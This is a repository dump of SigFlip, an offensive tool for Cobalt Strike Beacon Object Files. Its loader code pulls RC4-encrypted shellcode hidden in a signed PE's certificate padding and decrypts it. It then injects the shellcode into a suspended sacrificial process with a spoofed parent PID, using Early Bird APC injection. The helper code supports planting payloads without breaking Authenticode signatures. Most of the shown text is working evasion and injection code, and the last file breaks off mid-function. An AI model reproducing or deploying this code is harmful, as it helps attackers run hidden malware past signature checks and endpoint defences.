Project Path: arc_gmh5225_SigFlip_3yyqvmd8

Source Tree:

```txt
arc_gmh5225_SigFlip_3yyqvmd8
├── Bof
│   ├── SigLoader
│   │   ├── beacon.h
│   │   ├── common.h
│   │   ├── helpers.c
│   │   └── sigloader.c
│   ├── beacon.h
│   ├── common.h
│   ├── helpers.c
│   ├── sigflip.c
│   └── sigflip.cna
├── DotNet
│   ├── SigFlip
│   │   ├── SigFlip
│   │   │   ├── App.config
│   │   │   ├── PE.cs
│   │   │   ├── PEHeaders.cs
│   │   │   ├── Program.cs
│   │   │   ├── Properties
│   │   │   │   └── AssemblyInfo.cs
│   │   │   ├── SigFlip.csproj
│   │   │   ├── SigFlip.csproj.user
│   │   │   ├── Utils.cs
│   │   │   └── WinVerifyTrust.cs
│   │   └── SigFlip.sln
│   └── SigLoader
│       ├── SigLoader
│       │   ├── App.config
│       │   ├── Loader.cs
│       │   ├── Program.cs
│       │   ├── Properties
│       │   │   └── AssemblyInfo.cs
│       │   ├── SigLoader.csproj
│       │   ├── SigLoader.csproj.user
│       │   └── Utils.cs
│       └── SigLoader.sln
├── Golang
│   ├── BananaPhoneVer
│   │   ├── SigLoader.go
│   │   ├── go.mod
│   │   └── go.sum
│   ├── SigLoader.go
│   ├── go.mod
│   └── go.sum
├── LICENSE
├── Native
│   ├── SigFlip
│   │   ├── SigFlip
│   │   │   ├── Helper.cpp
│   │   │   ├── Helper.h
│   │   │   ├── SigFlip.cpp
│   │   │   ├── SigFlip.h
│   │   │   ├── SigFlip.vcxproj
│   │   │   ├── SigFlip.vcxproj.filters
│   │   │   ├── SigFlip.vcxproj.user
│   │   │   ├── pch.cpp
│   │   │   └── pch.h
│   │   └── SigFlip.sln
│   └── SigLoader
│       ├── SigLoader
│       │   ├── Helper.cpp
│       │   ├── Helper.h
│       │   ├── SigLoader.cpp
│       │   ├── SigLoader.vcxproj
│       │   ├── SigLoader.vcxproj.filters
│       │   └── SigLoader.vcxproj.user
│       └── SigLoader.sln
├── README.md
└── sigflip.cna

```

`Bof/SigLoader/beacon.h`:

```h
#ifndef _BEACON_
#define _BEACON_
/*
 * Beacon Object Files (BOF)
 * -------------------------
 * A Beacon Object File is a light-weight post exploitation tool that runs
 * with Beacon's inline-execute command.
 *
 * Cobalt Strike 4.1.
 */

/* data API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} datap;

DECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);
DECLSPEC_IMPORT int     BeaconDataInt(datap * parser);
DECLSPEC_IMPORT short   BeaconDataShort(datap * parser);
DECLSPEC_IMPORT int     BeaconDataLength(datap * parser);
DECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);

/* format API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} formatp;

DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);
DECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, char * text, int len);
DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, char * fmt, ...);
DECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);
DECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);

/* Output Functions */
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_ERROR       0x0d
#define CALLBACK_OUTPUT_UTF8 0x20

DECLSPEC_IMPORT void   BeaconPrintf(int type, char * fmt, ...);
DECLSPEC_IMPORT void   BeaconOutput(int type, char * data, int len);

/* Token Functions */
DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);
DECLSPEC_IMPORT void   BeaconRevertToken();
DECLSPEC_IMPORT BOOL   BeaconIsAdmin();

/* Spawn+Inject Functions */
DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);

/* Utility Functions */
DECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);

#endif
```

`Bof/SigLoader/common.h`:

```h
#ifndef _COMMON_
#define _COMMON_
#pragma once
#pragma comment(lib, "dbghelp.lib") 

#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>
#include <time.h>
#include <softpub.h>



WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR  lpProcName);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI FILE *__cdecl MSVCRT$fopen(const char *filename, const char *mode);
WINBASEAPI int __cdecl MSVCRT$fclose(FILE *stream);
WINBASEAPI size_t __cdecl MSVCRT$fwrite(const void *buffer,size_t size,size_t count,FILE *stream);
WINBASEAPI char* __cdecl MSVCRT$strrchr( const char *str, int c);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
WINBASEAPI time_t __cdecl MSVCRT$time( time_t *destTime );
DECLSPEC_IMPORT PIMAGE_NT_HEADERS IMAGEAPI DBGHELP$ImageNtHeader(PVOID Base);
DECLSPEC_IMPORT size_t __cdecl  MSVCRT$mbstowcs( wchar_t *wcstr, const char *mbstr, size_t count);

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (void);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
DECLSPEC_IMPORT WINBASEAPI PVOID WINAPI KERNEL32$HeapAlloc (HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD, BOOL, DWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject (HANDLE, DWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC, HANDLE, ULONG_PTR);
DECLSPEC_IMPORT WINBASEAPI PVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE, PVOID, DWORD, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$InitializeProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$UpdateProcThreadAttribute (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessW (LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx (HANDLE, PVOID, DWORD, DWORD, PDWORD);
#endif
```

`Bof/SigLoader/helpers.c`:

```c
#include "common.h"
#include "beacon.h"

#define SHA1LEN  20
#define print(format, ...) BeaconPrintf(CALLBACK_OUTPUT, format, ##__VA_ARGS__)


char* getFName(char* path, char* pFileName)
{

	MSVCRT$memcpy(pFileName, path, MSVCRT$strlen(path));

	if (path == NULL)
		return NULL;

	for (char* pCur = path; *pCur != '\0'; pCur++)
	{
		if (*pCur == '/' || *pCur == '\\')
			pFileName = pCur + 1;
	}

	return pFileName;
}

void crypt(unsigned char* data, long dataLen, char* key, long keyLen, unsigned char* result){
	unsigned char T[256];
	unsigned char S[256];
	unsigned char  tmp; 
	int j = 0, t = 0, i = 0;


	for (int i = 0; i < 256; i++){
		S[i] = i;
		T[i] = key[i % keyLen];
	}

	for (int i = 0; i < 256; i++){
		j = (j + S[i] + T[i]) % 256;
		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;
	}
	j = 0; 
	for (int x = 0; x < dataLen; x++){
		i = (i + 1) % 256; 
		j = (j + S[i]) % 256; 

		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;

		t = (S[i] + S[j]) % 256;

		result[x] = data[x] ^ S[t];
	}
}

BOOL IsWow64(HANDLE pHandle)
{
	BOOL isWow64 = FALSE;

	typedef BOOL(WINAPI *PFNIsWow64Process) (HANDLE, PBOOL);
	PFNIsWow64Process _FNIsWow64Process;
	_FNIsWow64Process = (PFNIsWow64Process)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32"), "IsWow64Process");

	if (NULL != _FNIsWow64Process){
		if (!_FNIsWow64Process(pHandle, &isWow64)) {}
	}
	return isWow64;
}

LPWSTR toMultiByte(DWORD strLen, CHAR* _Str, LPWSTR _wStr) {
	DWORD wlen = strLen * 2;
	_wStr = (LPWSTR)MSVCRT$malloc(wlen * sizeof(wchar_t));
	MSVCRT$mbstowcs(_wStr, _Str, MSVCRT$strlen(_Str) + 1);

	return _wStr;
}

```

`Bof/SigLoader/sigloader.c`:

```c
#include "common.h"
#include "beacon.h"
#include "helpers.c"


#define KEY_LEN 8

#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS  0x00020000

typedef struct _STARTUPINFOEXW { 
    STARTUPINFOW StartupInfo;
    struct _PROC_THREAD_ATTRIBUTE_LIST *lpAttributeList;
} STARTUPINFOEXW, *LPSTARTUPINFOEXW;

void go(char* args, int length) {

	datap parser;
	char* _fPath = NULL;
	char* _key = NULL;
	int _ppid;
	DWORD _keySize = 0;
	char* _sProcess;
	
	BeaconDataParse(&parser, args, length);

	_fPath = BeaconDataExtract(&parser, NULL);
	_key = BeaconDataExtract(&parser, NULL);
	_sProcess = BeaconDataExtract(&parser, NULL);
	_ppid = BeaconDataInt(&parser);
	_keySize = MSVCRT$strlen(_key);


	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert ;
	unsigned checksum = 0;
	FILE* _outFile = NULL;
	SIZE_T _writtenBytes = 0;
	CHAR* _encryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD  _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	HANDLE _oHandle = INVALID_HANDLE_VALUE;
	DWORD _extraPaddingCount = 0;
	CHAR* _extraPadding = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	CHAR* _sha1Hash = NULL;
	LPWSTR _fwPath = NULL;
	LPWSTR _owPath = NULL;
	DWORD _dataOffset = 0;
	SIZE_T _index = 0;
	BYTE* _pePtr = NULL;
	DWORD _encryptedDataSize = 0;
	CHAR* _decryptedData = NULL;


	char* _fName = (char*)MSVCRT$malloc(MSVCRT$strlen(_fPath) + 1);
	_fName = getFName(_fPath, _fName);

	print("[*]: Loading/Parsing PE File '%s'", _fName);
	_fHandle = KERNEL32$CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}
	
	_fSize = KERNEL32$GetFileSize(_fHandle, NULL);
	_peBlob = MSVCRT$malloc(_fSize);
	KERNEL32$ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}

	PIMAGE_DOS_HEADER _dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		print("'%s' is not a valid PE file", _fName);
		goto _Exit;
	}

	
	PIMAGE_NT_HEADERS _ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER _optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
	
	if (IsWow64(KERNEL32$GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}else{
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);


	print("[+]: Scanning for data/shellcode...");
	_pePtr = ((BYTE*)_peBlob + _CertTableRVA);
	for (_index = 0; _index < _CertTableSize; _index++) {
		if (*(_pePtr + _index) == 0xfe && *(_pePtr + _index + 1) == 0xed && *(_pePtr + _index + 2) == 0xfa && *(_pePtr + _index + 3) == 0xce) {
			print("[*]:Shellcode Found at 0x%x", (_pePtr + _index));
			_dataOffset = _index + 8;
			break;
		}
	}

	if (_dataOffset != _index + 8) {
		print("[!]: Could not locate data/shellcode");
		goto _Exit;
	}
	
	//Decrypting shellcode
	print("[+]: Decrypting shellcode...");
	_encryptedDataSize = _CertTableSize - _dataOffset;
	_decryptedData = (CHAR*)MSVCRT$malloc(_encryptedDataSize);
	MSVCRT$memcpy(_decryptedData, _pePtr + _dataOffset, _encryptedDataSize);
	crypt((unsigned char*)_decryptedData, _encryptedDataSize, _key, _keySize, (unsigned char*)_decryptedData);
	print("[+]: Decrypted shellcode size: %d", _encryptedDataSize);



	//Shellcode Injection - Early Bird

	LPCWSTR sProcess ;
	LPCWSTR sPArgs ;
	STARTUPINFOEXW si = { sizeof(si) }; 
	SIZE_T attrListSize;
	PROCESS_INFORMATION pi ;
	LPVOID memAddr; 
	LPVOID oldProtect;   
	HANDLE hProcess, hThread;
	NTSTATUS status;

	int scLen;
	char* scPtr;

	sProcess = toMultiByte(MSVCRT$strlen(_sProcess), _sProcess, sProcess);
	sPArgs = L"-u -p 12432 -s 23543"; //in case you using werfault.exe as a host process.
	scLen = _encryptedDataSize;
	scPtr = _decryptedData;

	SIZE_T _scSize = sizeof(scPtr) * scLen;
	print("[+]: SpawnTo: %ls",sProcess);
	print("[+]: Shellcode Size: %d",scLen);

	print("[+]: Obtaining a handle of PID %d", _ppid);
	HANDLE pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, _ppid);

	print("[+]: Spawning sacrificial process...");

	KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attrListSize);
	KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize);
	KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

	if (!KERNEL32$CreateProcessW(sProcess, NULL, NULL, NULL, FALSE,
	CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi)){
	    print("[!]: CreateProcessW() Error: %d", KERNEL32$GetLastError());
			goto _Exit;
	}

	KERNEL32$WaitForSingleObject(pi.hProcess, 2000);
	hProcess = pi.hProcess;
	hThread = pi.hThread;

	memAddr = KERNEL32$VirtualAllocEx(hProcess, NULL, _scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	print("[+]: Writing shellcode into remote process...");
	KERNEL32$WriteProcessMemory(hProcess, memAddr, scPtr, _scSize, NULL);

	KERNEL32$VirtualProtectEx(hProcess, memAddr, _scSize, PAGE_EXECUTE_READ, oldProtect);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)memAddr;

	print("[+]: Queueing a User APC and Resuming the main thread");
	KERNEL32$QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

	KERNEL32$ResumeThread(hThread);

	BeaconCleanupProcess(&pi);

		
	print("[*]: Done.");
	
	goto _Exit;

	_Exit:
		if (_peBlob) MSVCRT$free(_peBlob);
		if (_decryptedData) MSVCRT$free(_decryptedData);
		if (_fHandle) KERNEL32$CloseHandle(_fHandle);
		if (sProcess) MSVCRT$free(sProcess);

}



```

`Bof/beacon.h`:

```h
#ifndef _BEACON_
#define _BEACON_
/*
 * Beacon Object Files (BOF)
 * -------------------------
 * A Beacon Object File is a light-weight post exploitation tool that runs
 * with Beacon's inline-execute command.
 *
 * Cobalt Strike 4.1.
 */

/* data API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} datap;

DECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);
DECLSPEC_IMPORT int     BeaconDataInt(datap * parser);
DECLSPEC_IMPORT short   BeaconDataShort(datap * parser);
DECLSPEC_IMPORT int     BeaconDataLength(datap * parser);
DECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);

/* format API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} formatp;

DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);
DECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, char * text, int len);
DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, char * fmt, ...);
DECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);
DECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);

/* Output Functions */
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_ERROR       0x0d
#define CALLBACK_OUTPUT_UTF8 0x20

DECLSPEC_IMPORT void   BeaconPrintf(int type, char * fmt, ...);
DECLSPEC_IMPORT void   BeaconOutput(int type, char * data, int len);

/* Token Functions */
DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);
DECLSPEC_IMPORT void   BeaconRevertToken();
DECLSPEC_IMPORT BOOL   BeaconIsAdmin();

/* Spawn+Inject Functions */
DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);

/* Utility Functions */
DECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);

#endif
```

`Bof/common.h`:

```h
#ifndef _COMMON_
#define _COMMON_
#pragma once
#pragma comment(lib, "dbghelp.lib") 

#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>
#include <time.h>
#include <softpub.h>


WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR  lpProcName);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI void __cdecl MSVCRT$srand(unsigned int seed);  
WINBASEAPI int __cdecl MSVCRT$rand();  
WINBASEAPI FILE *__cdecl MSVCRT$fopen(const char *filename, const char *mode);
WINBASEAPI int __cdecl MSVCRT$fclose(FILE *stream);
WINBASEAPI size_t __cdecl MSVCRT$fwrite(const void *buffer,size_t size,size_t count,FILE *stream);
WINBASEAPI char* __cdecl MSVCRT$strrchr( const char *str, int c);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
WINBASEAPI time_t __cdecl MSVCRT$time( time_t *destTime );
WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult);
WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,LPDWORD lpcbData);
WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT PIMAGE_NT_HEADERS IMAGEAPI DBGHELP$ImageNtHeader(PVOID Base);
DECLSPEC_IMPORT size_t __cdecl  MSVCRT$mbstowcs( wchar_t *wcstr, const char *mbstr, size_t count);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptAcquireContextA(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD );
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptCreateHash( HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH * );
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptReleaseContext( HCRYPTPROV, DWORD );
WINADVAPI BOOL WINAPI ADVAPI32$CryptHashData( HCRYPTHASH, PBYTE, DWORD, DWORD );
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptDestroyHash( HCRYPTHASH );
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptGetHashParam( HCRYPTHASH, DWORD, PBYTE, PDWORD, DWORD );
WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
WINBASEAPI LONG WINAPI WINTRUST$WinVerifyTrust(HWND hwnd, GUID *pgActionID, LPVOID pWVTData);
WINBASEAPI void WINAPI SHLWAPI$PathStripPathA(LPSTR path);


#endif
```

`Bof/helpers.c`:

```c
#include "common.h"
#include "beacon.h"

#define SHA1LEN  20
#define print(format, ...) BeaconPrintf(CALLBACK_OUTPUT, format, ##__VA_ARGS__)


BOOL checkConfig() {
	HKEY _hKey;
	LONG _nResult;
	BOOL _check = FALSE;

	if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "\\Software\\Wow6432Node\\Microsoft\\Cryptography\\Wintrust\\Config",
		0, KEY_READ , &_hKey) == ERROR_SUCCESS || ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
		"\\Software\\Microsoft\\Cryptography\\Wintrust\\Config",0, KEY_READ, &_hKey) == ERROR_SUCCESS) {
		
		DWORD dwType;
		_nResult = ADVAPI32$RegQueryValueExA(_hKey, "EnableCertPaddingCheck", NULL, &dwType, NULL, NULL);
		if (_nResult == ERROR_SUCCESS)
			_check = TRUE;
		ADVAPI32$RegCloseKey(_hKey);
	}

	return _check;
}

char* getFName(char* path, char* pFileName)
{

	MSVCRT$memcpy(pFileName, path, MSVCRT$strlen(path));

	if (path == NULL)
		return NULL;

	for (char* pCur = path; *pCur != '\0'; pCur++)
	{
		if (*pCur == '/' || *pCur == '\\')
			pFileName = pCur + 1;
	}

	return pFileName;
}


unsigned short ChkSum(unsigned int CheckSum, void *FileBase, int Length)
{

	int *Data;
	int sum;

	if (Length && FileBase != NULL)
	{
		Data = (int *)FileBase;
		do
		{
			sum = *(unsigned short *)Data + CheckSum;
			Data = (int *)((char *)Data + 2);
			CheckSum = (unsigned short)sum + (sum >> 16);
		} while (--Length);
	}

	return CheckSum + (CheckSum >> 16);
}

unsigned int PEChecksum(void *FileBase, unsigned int FileSize)
{

	void *RemainData;
	int RemainDataSize;
	unsigned int PeHeaderSize;
	unsigned int HeaderCheckSum;
	unsigned int PeHeaderCheckSum;
	unsigned int FileCheckSum;
	PIMAGE_NT_HEADERS NtHeaders;
	
	NtHeaders = DBGHELP$ImageNtHeader(FileBase);
	if (NtHeaders)
	{
		HeaderCheckSum = NtHeaders->OptionalHeader.CheckSum;
		PeHeaderSize = (unsigned int)NtHeaders - (unsigned int)FileBase +
			((unsigned int)&NtHeaders->OptionalHeader.CheckSum - (unsigned int)NtHeaders);
		RemainData = &NtHeaders->OptionalHeader.Subsystem;
		PeHeaderCheckSum = ChkSum(0, FileBase, PeHeaderSize >> 1);
		FileCheckSum = ChkSum(PeHeaderCheckSum, RemainData, ((FileSize - PeHeaderSize - 4)/4));
		
		if (FileSize & 1)
		{
			FileCheckSum += (unsigned short)*((char *)FileBase + FileSize - 1);
		}
	}
	else
	{
		FileCheckSum = 0;
	}

	return (FileSize + FileCheckSum);
}

void* genKey(char* _key) {

	char _tmpkey[16] = "randomkeyrandom";

	MSVCRT$srand(MSVCRT$time(NULL));
	
	for (int i = 0; i < 15; ++i) {
		_tmpkey[i] = '0' + MSVCRT$rand() % 72;
	}

	MSVCRT$memcpy(_key, _tmpkey, sizeof(_tmpkey));
}

char* genRandomBytes(size_t _Len, char* _rpadding) {
		MSVCRT$srand(MSVCRT$time(NULL));
		const char* st = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#'?!";
		size_t sLen = 26 * 2 + 10 + 7;
		unsigned int key = 0;

		for (int n = 0; n < _Len; n++) {
			key = MSVCRT$rand() % sLen;
			_rpadding[n] = st[key];
		}

		_rpadding[_Len] = '\0';

		return _rpadding;
}

void crypt(unsigned char* data, long dataLen, char* key, long keyLen, unsigned char* result){
	unsigned char T[256];
	unsigned char S[256];
	unsigned char  tmp; 
	int j = 0, t = 0, i = 0;


	for (int i = 0; i < 256; i++){
		S[i] = i;
		T[i] = key[i % keyLen];
	}

	for (int i = 0; i < 256; i++){
		j = (j + S[i] + T[i]) % 256;
		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;
	}
	j = 0; 
	for (int x = 0; x < dataLen; x++){
		i = (i + 1) % 256; 
		j = (j + S[i]) % 256; 

		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;

		t = (S[i] + S[j]) % 256;

		result[x] = data[x] ^ S[t];
	}
}

BOOL IsWow64(HANDLE pHandle)
{
	BOOL isWow64 = FALSE;

	typedef BOOL(WINAPI *PFNIsWow64Process) (HANDLE, PBOOL);
	PFNIsWow64Process _FNIsWow64Process;
	_FNIsWow64Process = (PFNIsWow64Process)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32"), "IsWow64Process");

	if (NULL != _FNIsWow64Process){
		if (!_FNIsWow64Process(pHandle, &isWow64)) {}
	}
	return isWow64;
}

void toMultiByte(DWORD strLen, CHAR* _Str, LPWSTR _wStr) {
	DWORD wlen = strLen * 2;
	_wStr = (LPWSTR)MSVCRT$malloc(wlen * sizeof(wchar_t));
